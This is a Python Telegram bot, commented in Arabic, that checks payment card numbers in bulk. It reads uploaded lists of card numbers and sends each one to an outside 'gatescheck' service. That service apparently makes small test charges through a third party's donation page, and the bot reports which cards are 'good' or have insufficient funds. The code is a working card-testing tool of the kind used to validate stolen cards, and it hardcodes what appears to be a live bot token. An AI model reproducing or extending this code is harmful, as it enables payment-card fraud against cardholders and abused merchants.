import os
import re
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

TOKEN = '7327856614:AAG9fY6rjp_wPKTLNnQCgoZdzagla3h9-80'
API_URL = "http://gatescheck.duckdns.org:7000/check"

stop_flag = False

def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params)
        data = response.json()
        print("API response:", data)  # لطباعة استجابة الـ API
        return data.get('result', 'غير معروف')
    except Exception as e:
        return f"خطأ في التحقق: {e}"

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    stop_flag = False
    keyboard = [[InlineKeyboardButton("🚫 إيقاف الفحص", callback_data='stop')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("بدأ فحص الملف. اضغط على الزر لإيقاف الفحص.", reply_markup=reply_markup)

    try:
        if not os.path.exists('downloads'):
            os.makedirs('downloads')
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                if stop_flag:
                    break
                line = line.strip()
                card_number_matches = re.findall(r'\d+', line)
                if card_number_matches:
                    card_number = card_number_matches[0]
                    result = check_card_api(card_number)
                    if result == 'Insufficient Funds':
                        await update.message.reply_text(f"🚫 البطاقة: {line} - {result}")
                    elif result == 'charge':
                        await update.message.reply_text(f"✅ البطاقة: {line} تعتبر جيدة.")
                    elif 'خطأ' in result:
                        # عند وجود خطأ، نضع البطاقة والكلمة "خطأ" في رسالة واحدة بدون رسالة إضافية
                        await update.message.reply_text(f"البطاقة: {line} - خطأ")
                    else:
                        await update.message.reply_text(f"السطر: {line} - نتيجة غير معروفة: {result}")
                else:
                    await update.message.reply_text(f"السطر: {line} - لم يتم العثور على رقم بطاقة.")
        if stop_flag:
            await update.message.reply_text("تم إيقاف الفحص.")
        else:
            await update.message.reply_text("انتهى الفحص.")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ أثناء معالجة الملف: {e}")

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag
    query = update.callback_query
    await query.answer()
    if query.data == 'stop':
        stop_flag = True
        await query.edit_message_text(text="تم إيقاف الفحص.")
    elif query.data == 'charge':
        await query.edit_message_text(text="أرسل لي عدد الوحدات لCharge.")
        context.user_data['action'] = 'charge'
    elif query.data == 'insufficient':
        await query.edit_message_text(text="أرسل لي عدد الوحدات لنقص الفلوس (Insufficient Funds).")
        context.user_data['action'] = 'insufficient'
    elif query.data == 'error':
        await query.edit_message_text(text="هذه البطاقة تحتوي على مشكلة (خطأ).")

async def handle_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'action' in context.user_data:
        action = context.user_data['action']
        units = update.message.text
        if units.isdigit():
            if action == 'charge':
                await update.message.reply_text(f"تم استلام {units} وحدات لCharge.")
            elif action == 'insufficient':
                await update.message.reply_text(f"تم استلام {units} وحدات لـInsufficient Funds.")
        else:
            await update.message.reply_text("يرجى إرسال رقم صحيح.")
        del context.user_data['action']

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # أزرار في أعلى البوت
    keyboard = [
        [
            InlineKeyboardButton("Charge", callback_data='charge'),
            InlineKeyboardButton("Insufficient Funds", callback_data='insufficient'),
            InlineKeyboardButton("Card Error", callback_data='error')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('مرحبًا! اختر أحد الخيارات أعلاه أو أرسل ملف للتحقق.', reply_markup=reply_markup)

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("يرجى إرسال رقم البطاقة بعد الأمر /pp. مثال: /pp 1234567890")
            return
        card_number = context.args[0]
        result = check_card_api(card_number)
        if result == 'Insufficient Funds':
            await update.message.reply_text(f"🚫 نتيجة التحقق للبطاقة {card_number}: {result}")
        elif result == 'charge':
            await update.message.reply_text(f"✅ البطاقة {card_number} تعتبر جيدة.")
        elif 'خطأ' in result:
            # عند وجود خطأ، نضع البطاقة والكلمة "خطأ" في رسالة واحدة
            await update.message.reply_text(f"البطاقة: {card_number} - خطأ")
        else:
            await update.message.reply_text(f"نتيجة غير معروفة: {result}")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {e}")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_user_input))

    app.run_polling()

if __name__ == '__main__':
    main()
